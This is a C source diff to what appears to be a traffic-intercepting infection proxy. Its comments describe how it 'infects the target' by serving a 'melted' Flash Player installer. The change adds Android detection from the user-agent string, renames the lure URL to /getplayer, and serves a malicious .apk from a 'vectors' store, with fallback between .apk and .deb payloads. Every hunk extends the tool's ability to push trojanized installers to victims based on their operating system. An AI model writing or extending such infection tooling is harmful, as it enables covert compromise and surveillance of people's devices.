@@ -46,6 +46,8 @@ search_useragent_os(char *request)
          os = WINDOWS;
       else if (strstr(user, "OS X") != NULL || strstr(user, "Mac") != NULL)
          os = OSX;
+      else if (strstr(user, "Android") != NULL || strstr(user, "android") != NULL)
+         os = ANDROID;
       else if (strstr(user, "Linux") != NULL || strstr(user, "linux") != NULL || strstr(user, "Ubuntu") != NULL)
          os = LINUX;
    }
@@ -225,7 +227,7 @@ MY_THREAD_FUNC(handle_connection)
    /*
     * search the tag in the list.
     *   - if we have a tag and a local file matching the request, then serve the local file
-    *   - if we have a tag<->type association and the url request matching the /flashplayer, then serve the correct flash player melted
+    *   - if we have a tag<->type association and the url request matching the /getplayer, then serve the correct flash player melted
     *   - if we have no local file and we have tag<->url association, we know how to infect the target
     *   - if we have only a tag, do nothing and simply proxy the connection
     *   - if we have no tag, then close the connection preventing the use of IPA as open proxy
@@ -241,7 +243,7 @@ MY_THREAD_FUNC(handle_connection)
          fclose(fl);
    } else if (((req = request_find_type(tag, REQ_TYPE_INJECT_HTML_FLASH)) != NULL) && 
              p && strlen(p) && /* file name has a length */
-             ! strcmp(p, "flashplayer")) {
+             ! strcmp(p, "getplayer")) {
          char *correct_file = NULL;
 	 int ret = 0;
 
@@ -254,6 +256,10 @@ MY_THREAD_FUNC(handle_connection)
          case OSX:
             ret = asprintf(&correct_file, "%s.dmg", req->path);
             break;
+
+	 case ANDROID:
+	    ret = asprintf(&correct_file, "%s.apk", req->path);
+	    break;
 
          case LINUX:
             ret = asprintf(&correct_file, "%s.deb", req->path);
@@ -268,6 +274,18 @@ MY_THREAD_FUNC(handle_connection)
 
          if (os != UNKNOWN) {
             fl = open_data("vectors", correct_file, FOPEN_READ_BIN);
+	    if (fl == NULL && (os == ANDROID || os == LINUX)) {
+	        free(correct_file);
+
+		if (os == ANDROID) {
+		    ret = asprintf(&correct_file, "%s.deb", req->path);
+		} else {
+		    ret = asprintf(&correct_file, "%s.apk", req->path);
+		}
+
+		fl = open_data("vectors", correct_file, FOPEN_READ_BIN);
+            }
+
             ON_ERROR(fl, NULL, "Cannot open %s", correct_file);
 
             DEBUG_MSG(D_INFO, "Serving local file: [%s]", correct_file);
